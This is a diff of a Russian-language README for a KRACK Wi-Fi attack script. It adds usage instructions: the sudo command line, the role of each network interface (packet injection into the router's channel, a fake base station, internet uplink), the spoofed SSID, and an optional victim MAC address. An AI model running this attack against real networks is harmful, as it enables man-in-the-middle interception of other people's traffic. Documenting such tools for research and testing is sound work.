@@ -30,12 +30,17 @@ $pip install --user mitm_channel_based
  Запустить скрипт
  
  ```
+ $sudo ./krackattack/krack_all_zero_tk.py wlan1 wlan0 usb0 "Familia Couto" 
+ или можно еще добавить параметр MAC жертвы
  $sudo ./krackattack/krack_all_zero_tk.py wlan1 wlan0 usb0 "Familia Couto" -t 00:21:5d:ea:fe:be
- ```
+ 
+ ```Обязательные параметры
  * `wlan1`: интерфейс, на котором слушаем и внедряем пакеты в реальный канал роутера
  * `wlan0`: интерфейс с поддельной базовой станцией
  * `usb0`: интерфейс с интернетом, может быть что угодно, Ethernet например
  * `"Familia Couto"`: SSID станции в роутеры, которую подделываем
+
+```Необязательные параметры 
  * `-t 00:21:5d:ea:fe:be`: MAC адрес жертвы
  * Другие настройки можно узнать так `./krackattack/krack_all_zero_tk.py -h`!
  
